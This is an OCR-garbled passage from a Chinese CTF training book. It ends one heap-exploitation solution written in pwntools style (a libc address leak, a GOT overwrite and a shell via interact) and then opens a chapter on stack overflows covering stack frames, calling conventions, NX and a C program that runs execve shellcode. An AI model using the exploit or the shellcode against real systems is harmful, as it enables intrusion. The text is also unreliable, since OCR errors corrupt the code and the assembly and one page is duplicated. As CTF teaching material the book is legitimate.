## Page 380
CTF特训营：技术详解、解题方法与
11.6真题解析
380/1144
head_ptr_addr=0x804B1C0
atoi_got=0x0804b038
name ='d*32+132(malloc_got -4)+I32(0)+I32(0x31) +132(head_ptr_addr-
0x8 -0x4)
dian_cai(io,name,32)
dian_cai(io,name,32)
review(io)
io.read_until("Cart:\n")
io.readuntil("\n")
malloc _addr= io.read（4)
malloc_addr=132（malloc_addr)
print hex(malloc_addr)
name=I32（atoi_got)
offset_malloc=0x00076550
offset_system=0x0003e800
p_11_ebp_ret=0x08048c29
leave_ret=0x080485c8
#libc_base= malloc_addr-offset_malloc
#system_addr=libc_base+offset_system
#count=system_addr>>1
#count=struct.unpack("r",132(system_addr)[0]
count=struct.unpack(i,132（p_11_ebp_ret）)[0]
io.gdb_hint()
dian_cai(io,name,count)
io.readuntil("choose:ln")
payload =a'*8+132(useful_addr+0x80)+I32(leave_ret)
io.writeline(payload)
#io.read until("choose:ln")
#io.writeline(/bin/sh")
io.interact()
io= get_io（target)
pwn(io)
---
## Page 381
CTF特训营：技术详解、解题方法与
12.1找介绍
381/1144
第12章栈相关漏洞
12.1栈介绍
程序栈主要用于存储程序运行过程中的局部信息，大小不固定
是动态增长的。栈内存一般可以根据函数栈来进行划分（不使用函数
的程序比较少见），不同的函数栈之间是相互隔离的，从而能够实现
有效的函数切换。函数栈上存储的信息一般包括：临时变量（包括栈
保护哨canary）、函数的返回栈基址（bp）、函数的返回地址（ip）。
程序栈的示意如图12-1所示。
---
## Page 382
CTF特训营：技术详解、解题方法与
12.1找介绍
382/1144
低地址
局部变量
sub_func(proc)
ebp/rbp
ret to main(proc)
main(proc)
argi
gm
argn
ret to_Hbc_start_main(libc)
_libc_start_main(libc)
argv字符申
env指针
环境字符串
高地址
图12-1
程序栈的示意图
---
## Page 383
CTF特训营：技术详解、解题方法与
12.1.1函数找的调用机制
383/1144
12.1.1函数栈的调用机制
程序运行时，为了实现函数之间的相互隔离，需要在进入新函数
之前保存当前函数的状态，而这些状态信息全在栈上。为了实现状态
的隔离，由此引出了函数栈的概念，当前函数栈的边界就是栈顶指针
(sp）和栈底指针（bp）所指的区域。sp主要指esp（x86）和
rsp（x64），bp主要指ebp（x86）和rbp（x64）。
在函数调用（即进入子函数时）时，首先将参数入栈，然后压入
返回地址和栈底指针寄存器bp（也有不压bp的情况），其中压入返回
地址是通过call实现的。
在函数结束时，将sp重新指向bp的位置，并弹出bp（与前面是
否压入bp保持一致）和返回地址ip，通常，弹出bp是通过leave或者
来（dqedod星dqudod）dqdod
x86示例如图12-2所示。
---
## Page 384
CTF特训营：技术详解、解题方法与
12.1.1函数找的调用机制
384/1144
.text:088483B4
public test_func
.text:080483B4 test_func
proc near
; CODE XREF: nain+6↓p
.text:080483B4
push
ebp,esp
dqa
.text:080483B5
.text:08048387
sub
esp,18h
.text:08B483BA
nou
duord ptr [esp],offset s;“hello world"
.text:080483C1
call
_puts
.text:080483c6
leave
.text:08048307
retn
.text:088483c7 test_func
endp
图12-2
x86程序参数传递实例
x64示例如图12-3所示。
.text:0000000000400536
public test_func
.text:0000000000400536 test_func
proc near
；CODE xREF: nain+9↓p
.text:0000000000400536
push
rbp
.text:0000000000400537
ROU
ds. 'dq.
text:000000000040053A
ROU
edi,offset 5
:"hello world"
.text:000000000040053F
cal1
_puts
.text:0000000000400544
dod
rbp
retn
.text:0000000000400545 test_func
endp
图12-3
3x64程序参数传递实例
修改bp寄存器，然后执行ret，函数状态将恢复成进入子函数时
的状态，实现了函数栈的切换。
函数栈示意如图12-4所示。
---
## Page 385
CTF特训营：技术详解、解题方法与
12.1.1函数找的调用机制
385/1144
esp/rsp
低地址
局部变量
函数栈
ebp/rbp—
ebp/rbp
rip/eip
函数参数
......
局部变量
函数栈
ebp/rbp
rip/eip
高地址
图12-4函数栈示意图
在函数栈中，bp中存储了上个函数栈的基址，而ip存储的是调用
处的下一条指令位置。返回当前函数时，会从栈上弹出这两个值，从
而恢复上一个函数的信息。
---
## Page 386
CTF特训营：技术详解、解题方法与
12.1.2函数参数传递
386/1144
12.1.2函数参数传递
由于函数的传参规则受函数调用协议的影响，因此本节首先简单
介绍一下函数调用协议。
__stdcall、__cdec和_fastcall是三种函数调用协议，函数调用协
议会影响函数参数的入栈方式、栈平衡的修复方式、编译器函数名的
修饰规则等。
调用协议的常用场合如下。
__stdcall：WindowsAPi默认的函数调用协议。
_cdecl:C/C++默认的函数调用协议。
_fastcall：适用于对性能要求较高的场合。
函数参数的入栈方式包含如下几种。
_stdcall：函数参数由右向左入栈。
_cdecl：函数参数由右向左入栈。
_fastcall：从左开始将不大于4字节的参数放入CPU的ecx和edx
---
## Page 387
CTF特训营：技术详解、解题方法与，
12.1.2函数参数传递
387/1144
寄存器，其余参数从右向左入栈。
栈平衡的修复方式包含以下几种。
__stdcall：函数调用结束后由被调用函数来平衡栈。
_cdecl：函数调用结束后由函数调用者来平衡栈。
_fastcall：函数调用结束后由被调用函数来平衡栈。
对于Linux程序来说，通常采用cdecl的调用方式，所以这里主
要介绍这种调用方式下的函数传参规则。
对于x86程序
普通函数传参：参数基本都压在栈上（有寄存器传参的情况
可查阅相关资料）。
syscall传参：eax对应系统调用号，ebx、ecx、edx、esi、edi
ebp分别对应前六个参数。多余的参数压在栈上。
对于x64程序
普通函数传参：先使用rdi、rsi、rdx、rcx、r8、r9寄存器作为函
数参数的前六个参数，多余的参数会依次压在栈上。
---
## Page 388
CTF特训营：技术详解、解题方法与
12.1.2函数参数传递
388/1144
syscall传参：rax对应系统调用号，传参规则与普通函数传参一
致。
对于arm程序：R0、R1、R2、R3，依次对应前四个参数，多余
的参数会依次压在栈上。
_stdcal和_fastcall这两种调用方式的传参规则可参考上文中的
函数参数入栈方式，更多信息可以查阅相关资料进行扩展。
其中普通函数传参示例如下。
测试代码如下：
#include
ee%%%%%）
arg6,arg7);
int main()
test_func(0,1,2,3,4,5,6,7）;
x86反汇编代码如图12-5所示。
---
## Page 389
CTF特训营：技术详解、解题方法与
12.1.2函数参数传递
388/1144
syscall传参：rax对应系统调用号，传参规则与普通函数传参一
致。
对于arm程序：R0、R1、R2、R3，依次对应前四个参数，多余
的参数会依次压在栈上。
_stdcall和_fastcall这两种调用方式的传参规则可参考上文中的
函数参数入栈方式，更多信息可以查阅相关资料进行扩展。
其中普通函数传参示例如下。
测试代码如下：
#include
%%%%%）d
arg6,arg7);
int main()
test_func(0,1,2,3,4,5,6,7）;
x86反汇编代码如图12-5所示。
---
## Page 390
CTF特训营：技术详解、解题方法与
12.2.1基本概念
390/1144
12.2
栈溢出
12.2.1
基本概念
栈溢出是指栈上的缓冲区被填入了过多的数据，超出了边界，从
而导致栈上原有的数据被覆盖。栈溢出是缓冲区溢出的一种类型，示
意如图12-7所示。
buff
data
....
图12-7缓冲区溢出示意图
从前面的函数栈示意图（图12-4）可以看出，里面比较重要的数
据主要可分为三部分，即局部变量、bp和ip，这几部分存储的数据都
---
## Page 391
CTF特训营：技术详解、解题方法与
12.2.1基本概念
391/1144
很关键，主要作用如下。
局部变量：局部变量在函数中的作用很大，如构造危险输入、
影响条件分支的转移等，这些都能起到改变控制流或者方便构造更强
大的漏洞的作用。
bp：函数栈栈底指针，能够直接影响返回函数的栈，如果恢复
响控制流；同时，有些参数以及临时变量在代码中很有可能是根据
bp来索引的（具体见汇编代码），因此也能影响局部变量或者参数的
使用，从而影响控制流。
ip：程序返回地址，能够直接影响控制流，如ip指向危险函数
直接调用rop等。
---
## Page 392
CTF特训营：技术详解、解题方法与
12.2.2覆盖找缓冲区的具体用途
392/1144
12.2.2覆盖栈缓冲区的具体用途
根据前面所述的函数栈所存储的信息，栈上能够控制的信息很
多，可操作的空间是很大的，真体需要根据能覆盖的情况进行分析
下面主要针对栈缓冲区覆盖的几个方面进行详细介绍。
1）数据不可执行（NX/DEP）及栈保护哨（canary）相关说明）
2）覆盖当前栈中函数的返回地址（当前函数或者之前的函
数），获取控制流。
3）覆盖栈中所存储的临时变量（当前函数或者之前的函数）。
4）覆盖栈底寄存器bp（之前的函数）。
5）关注敏感函数。
对上述5个方面的具体介绍如下。
1）数据不可执行（NX/DEP），主要是防止直接在缓冲区（堆、
栈、数据段）存放可执行的代码（如shellcode等），增加漏洞的利用
难度。一般情况下，拿到程序之后，首先会检查程序的保护机制开启
情况，尤其需要关注是否开启NX，检查命令为“checksec./proc”
---
## Page 393
CTF特训营：技术详解、解题方法与
12.2.2要盖找缓冲区的具体用途
393/1144
NX检测示意如图12-8所示。
NX开启和关闭的情况分别如图12-8a和图12-8b所示
'/tmp/proc_nx'
[*]'/tmp/proc'
Arch:
amd64-64-1ittle
Arch:
and64-64-little
RELRO:
Parttal RELRO
RELRO:
Parttal RELRO
Stack:
No canary found
Stack:
No canary found
NX:
NX enabled
NX:
NX disabled
PIE:
No PIE
PIE:
No PIE
a）开启
b）关闭
图12-8NX检测示意图
关闭Nx的编译选项为“-zexecstack"，默认是开启的。
示例代码如下：
#include
charshellcode=x31lxc0lx48lxbblxd1lx9dlx96lx91lxd0/x8clx97xfflx48lxf7xdblx53\
x54lx5flx99/x52/x57x54lx5elxb0lx3blx0flx05";
int main()
char stack buff[0x40];
char *heap_buff =malloc(0x40);
memcpy（stack_buff, shellcode,sizeof(shellcode));
memcpy(heap_buff, shellcode, sizeof（shellcode));
//(（void(*)(void))shellcode)();
（（void(*)（void）)stack_buff)();